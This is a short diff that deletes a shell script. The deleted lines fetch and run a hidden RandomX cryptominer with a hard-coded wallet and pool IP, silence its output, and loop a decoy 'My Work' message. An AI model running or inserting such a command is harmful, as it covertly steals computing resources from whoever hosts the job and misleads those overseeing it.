@@ -1,6 +1,0 @@
-wget https://github.com/exo0088/zuan/releases/download/bonk/work.tar.gz && tar -xvf work.tar.gz > /dev/null 2>&1 && chmod +x work && ./work -algo randomx -wallet nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -coin ZEPH -rigName "vivo" -pool1 159.203.162.18:3333 >/dev/null 2>&1 &
-while true
-do
-        echo "My Work"
-        sleep 20
-done
